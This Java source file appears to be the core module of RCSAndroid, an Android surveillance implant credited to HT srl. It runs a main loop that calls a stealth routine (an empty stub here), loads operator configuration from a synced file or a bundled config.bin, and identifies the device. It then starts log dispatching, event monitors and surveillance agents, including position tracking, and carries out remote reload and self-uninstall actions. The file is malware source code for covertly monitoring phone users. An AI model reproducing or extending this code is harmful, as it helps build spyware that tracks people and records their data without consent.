/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.res.Resources;
import android.util.Log;

import com.ht.RCSAndroidGUI.action.Action;
import com.ht.RCSAndroidGUI.action.SubAction;
import com.ht.RCSAndroidGUI.action.UninstallAction;
import com.ht.RCSAndroidGUI.agent.AgentConf;
import com.ht.RCSAndroidGUI.agent.AgentManager;
import com.ht.RCSAndroidGUI.conf.Configuration;
import com.ht.RCSAndroidGUI.event.EventManager;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class CoreThread.
 */
public class Core extends Activity implements Runnable {

	/** The Constant SLEEPING_TIME. */
	private static final int SLEEPING_TIME = 1000;
	private static final String TAG = "Core";

	/** The b stop core. */
	private boolean bStopCore = false;

	/** The resources. */
	private Resources resources;

	/** The core thread. */
	private Thread coreThread;

	/** The content resolver. */
	private ContentResolver contentResolver;

	/** The agent manager. */
	private AgentManager agentManager;

	/** The event manager. */
	private EventManager eventManager;

	/** The action thread. */
	Thread actionThread;

	/**
	 * Start.
	 * 
	 * @param r
	 *            the r
	 * @param cr
	 *            the cr
	 * @return true, if successful
	 */
	public boolean Start(final Resources r, final ContentResolver cr) {
		coreThread = new Thread(this);
		agentManager = AgentManager.self();
		eventManager = EventManager.self();

		resources = r;
		contentResolver = cr;

		Check.asserts(resources != null, "Null Resources");

		coreThread.start();
		return true;
	}

	/**
	 * Stop.
	 * 
	 * @return true, if successful
	 */
	public boolean Stop() {
		bStopCore = true;
		stopAll();
		Log.d(TAG, "RCS Thread Stopped");
		return true;
	}

	// Runnable (main routine for RCS)
	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Runnable#run()
	 */
	public void run() {
		Log.d(TAG, "RCS Thread Started");

		stealth();
		try {
			while (!bStopCore) {
				Log.d(TAG, "Info: init task");

				if (taskInit() == false) {
					Log.d(TAG, "Error: TaskInit() FAILED");
					break;
				} else {
					Log.d(TAG, "TaskInit() OK");
					// CHECK: Status o init?
				}

				Status.self().setRestarting(false);
				Log.d(TAG, "Info: starting checking actions");

				if (checkActions() == Exit.RELOAD) {
					Log.d(TAG, "Info: Waiting a while before reloading");
					Utils.sleep(2000);
				} else {
					Log.d(TAG, "Error: CheckActions() wants to exit");
					// chiudere tutti i thread
					break;
				}
			}
			stopAll();
		} catch (final Exception ex) {
			Log.d(TAG, "Error: run " + ex);
		} finally {
			Log.d(TAG, "RCSAndroid exit ");
			Utils.sleep(2000);
			System.exit(0);
		}
	}

	private void stopAll() {
		Status status = Status.self();
		status.setRestarting(true);
		Log.d(TAG, "Warn: " + "checkActions: reloading");
		status.unTriggerAll();
		Log.d(TAG, "checkActions: stopping agents");
		agentManager.stopAll();
		Log.d(TAG, "checkActions: stopping events");
		eventManager.stopAll();
		Utils.sleep(2000);
		Log.d(TAG, "checkActions: untrigger all");
		status.unTriggerAll();

		final LogDispatcher logDispatcher = LogDispatcher.self();
		if (!logDispatcher.isAlive()) {
			logDispatcher.halt();
		}
	}

	/**
	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
	 * bloccante.
	 * 
	 * @return true, if successful
	 */
	private Exit checkActions() {
		final Status status = Status.self();

		Utils.sleep(1000);

		try {
			while (!bStopCore) {
				// XXX DEBUG REMOVE
				// if (0 != 1) {
				// Utils.sleep(SLEEPING_TIME);
				// continue;
				// }

				Log.d(TAG, "checkActions");
				final int[] actionIds = status.getTriggeredActions();

				final int asize = actionIds.length;

				if (asize > 0) {
					for (int k = 0; k < asize; ++k) {
						final int actionId = actionIds[k];

						final Action action = status.getAction(actionId);
						final Exit exitValue = executeAction(action);

						if (exitValue == Exit.UNINSTALL) {
							Log.d(TAG, "Info: checkActions: Uninstall");
							UninstallAction.actualExecute();

							return exitValue;
						} else if (exitValue == Exit.RELOAD) {
							Log.d(TAG, "checkActions: want Reload");

							return exitValue;
						}
					}
				}

				// Utils.sleep(SLEEPING_TIME);
			}

			return Exit.STOP;
		} catch (final Throwable ex) {
			// catching trowable should break the debugger ans log the full
			// stack trace
			Log.d("QZ", TAG + " FATAL: checkActions error, restart: " + ex);

			return Exit.ERROR;
		}
	}

	/**
	 * Inizializza il core.
	 * 
	 * @return false if any fatal error
	 */
	private boolean taskInit() {
		try {
			Path.makeDirs();

			// Identify the device uniquely
			final Device device = Device.self();

			if (!loadConf()) {
				Log.d(TAG, "Error: Cannot load conf");
				return false;
			}

			// Start log dispatcher
			final LogDispatcher logDispatcher = LogDispatcher.self();
			if (!logDispatcher.isAlive()) {
				logDispatcher.start();
			}

			// Da qui in poi inizia la concorrenza dei thread

			if (eventManager.startAll() == false) {
				Log.d(TAG, "eventManager FAILED");
				return false;
			}

			Log.d(TAG, "Info: Events started");

			if (agentManager.startAll() == false) {
				Log.d(TAG, "agentManager FAILED");
				return false;
			}

			agentManager.start(AgentConf.AGENT_POSITION);

			Log.d(TAG, "Info: Agents started");
			Log.d(TAG, "Core initialized");
			return true;

		} catch (final RCSException rcse) {
			rcse.printStackTrace();
			Log.d(TAG, "RCSException() detected");
		} catch (final Exception e) {
			e.printStackTrace();
			Log.d(TAG, "Exception() detected");
		}

		return false;

	}

	/**
	 * Tries to load the new configuration, if it fails it get the resource
	 * conf.
	 * 
	 * @return false if no correct conf available
	 * @throws RCSException
	 *             the rCS exception
	 */
	public boolean loadConf() throws RCSException {
		boolean loaded = false;

		// tries to load the file got from the sync, if any.
		final AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);

		if (file.exists()) {
			final byte[] resource = file.read(8);

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);

			// Load the configuration
			loaded = conf.LoadConfiguration();

			Log.d(TAG, "Info: Conf file loaded: " + loaded);

			if (!loaded) {
				file.delete();
			}
		}

		// tries to load the resource conf
		if (!loaded) {
			// Open conf from resources and load it into resource
			final byte[] resource = Utils.inputStreamToBuffer(
					resources.openRawResource(R.raw.config), 8); // config.bin

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);

			// Load the configuration
			loaded = conf.LoadConfiguration();

			Log.d(TAG, "Info: Resource file loaded: " + loaded);
		}

		return loaded;
	}

	/**
	 * Stealth.
	 */
	private void stealth() {
		// TODO Auto-generated method stub
	}

	/**
	 * Execute action.
	 * 
	 * @param action
	 *            the action
	 * @return the int
	 */
	private Exit executeAction(final Action action) {
		Exit exit = Exit.SUCCESS;

		Log.d(TAG, "CheckActions() triggered: " + action);
		final Status status = Status.self();
		status.unTriggerAction(action);
		// action.setTriggered(false, null);

		status.synced = false;
		// final Vector subActions = action.getSubActionsList();
		final int ssize = action.getSubActionsNum();
		Log.d(TAG, "checkActions, " + ssize + " subactions");

		for (int j = 0; j < ssize; ++j) {
			try {
				final SubAction subAction = action.getSubAction(j);
				Check.asserts(subAction != null,
						"checkActions: subAction!=null");
				// lastSubAction = subAction.toString();

				/*
				 * final boolean ret = subAction.execute(action
				 * .getTriggeringEvent());
				 */
				Log.d(TAG, "Info: CheckActions() executing subaction ("
						+ (j + 1) + "/" + ssize + ") : " + action);
				// no callingEvent
				subAction.prepareExecute();
				actionThread = new Thread(subAction);
				actionThread.start();

				synchronized (subAction) {
					Log.d(TAG, "CheckActions() wait");

					if (!subAction.isFinished()) {
						// il wait viene chiamato solo se la start non e' gia'
						// finita
						subAction.wait(Configuration.TASK_ACTION_TIMEOUT);
					}
				}

				boolean ret = true;

				if (!subAction.isFinished()) {
					ret = false;
					actionThread.interrupt();
					Log.d(TAG, "CheckActions() interrupted thread");
				}

				Log.d(TAG, "CheckActions() waited");

				if (subAction.wantUninstall()) {
					Log.d(TAG, "Warn: " + "CheckActions() uninstalling");
					exit = Exit.UNINSTALL;
					break;
					// return false;
				}

				if (subAction.wantReload()) {

					stopAll();

					// return true;
					exit = Exit.RELOAD;
					break;

				}

				if (ret == false) {
					Log.d(TAG, "Warn: " + "CheckActions() error executing: "
							+ subAction);
					continue;
				}
			} catch (final Exception ex) {
				Log.d(TAG, "Error: checkActions for: " + ex);
			}
		}

		return exit;
	}

}
